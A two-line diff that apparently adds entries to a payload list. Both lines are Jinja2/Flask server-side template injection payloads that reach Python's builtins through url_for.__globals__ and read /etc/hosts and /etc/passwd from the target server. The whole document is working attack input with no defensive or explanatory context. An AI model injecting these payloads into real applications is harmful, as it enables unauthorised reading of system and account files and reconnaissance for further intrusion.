@@ -1,0 +1,2 @@
+{{url_for.__globals__['__builtins__']['open']('/etc/hosts').read()}}
+{{url_for.__globals__['__builtins__']['open']('/etc/passwd').read()}}
